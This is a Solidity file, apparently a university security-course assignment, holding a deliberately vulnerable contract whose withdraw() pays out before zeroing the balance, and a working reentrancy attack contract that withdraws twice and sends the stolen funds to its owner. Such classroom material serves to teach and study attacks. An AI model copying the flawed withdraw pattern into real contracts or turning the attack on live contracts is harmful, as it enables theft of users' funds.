/**
 *Submitted for verification at Etherscan.io on 2021-12-07
*/

pragma solidity ^0.6.0;

// SPDX-License-Identifier: WTFPL

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}


// This contract is built to attack the above contract
contract JandJAttack{
    address owner;
    Vuln vuln;
    bool stealFlag;

    constructor() public {
        owner = msg.sender;
        vuln = Vuln(0x36A540E3A78084962B75E25877CfACf8846Be018); //given in the assignment description
        stealFlag = false;
    }

    function steal() public payable {
        // deposit some money into our account so there's something to clone
        vuln.deposit{value:msg.value}();
        // reset our flag, we haven't gotten the first part yet
        stealFlag = false;
        // call withdraw (which calls our receive function)
        // this will give us 2*val into this contract
        vuln.withdraw();
        // send the 2x value back to the contract owner
        owner.call{value:(msg.value*2)}("");
    }

    // called when receiving our deposit back
    receive() external payable{
        // if stealFlag is true, we've already got our original value back, so can stop
        // if it's false, it means we need to call withdraw a second time
        if(!stealFlag){
            // make sure to do everything before calling withdraw!!
            stealFlag = true;
            vuln.withdraw();
        } // else do nothing, just receive the money into this contract
    }
}